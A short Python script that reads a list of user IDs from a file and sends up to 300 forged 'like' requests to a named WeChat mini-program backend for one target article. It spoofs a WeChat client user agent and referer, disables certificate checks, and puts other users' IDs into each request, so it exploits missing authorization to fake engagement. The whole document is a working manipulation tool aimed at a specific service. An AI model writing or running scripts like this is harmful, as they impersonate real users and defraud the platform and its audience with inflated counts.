'''
NOT APPLICABLE

If userId DNE the operation will fail
'''


import json
import threading
import time

import requests
import string
import random

articleId = 'XXX'
limit = 300

requests.packages.urllib3.disable_warnings()
base_url = "https://www.jumboxtech.com:8022/social/userLike"
header = {
    'Host': 'www.jumboxtech.com:8022',
    'Connection': 'keep-alive',
    # 'Content-Length': '39',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; GM1900 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Safari/537.36 MMWEBID/9558 MicroMessenger/8.0.2.1860(0x28000234) Process/appbrand0 WeChat/arm32 Weixin Android Tablet NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
    'charset': 'utf-8',
    'Accept-Encoding': 'gzip,compress,br,deflate',
    'content-type': 'application/x-www-form-urlencoded',
    'Referer': 'https://servicewechat.com/wxf7f31446cd68367a/5/page-frame.html',
}

with open('ids.txt', 'r', encoding='utf-8') as f:
    for line in f:
        line = line.replace('\n', '').split(',')[0]
        limit -= 1
        s = requests.session()
        s.keep_alive = False
        payload = f'userId={line}&targetType=ARTICLE&ActionType=1&targetId={articleId}'
        print(payload)
        req = s.post(base_url, headers=header, data=payload, verify=False)
        ob = json.loads(req.content.decode(encoding='utf-8'))
        print(req.content.decode(encoding='utf-8'))
        if limit == 0:
            break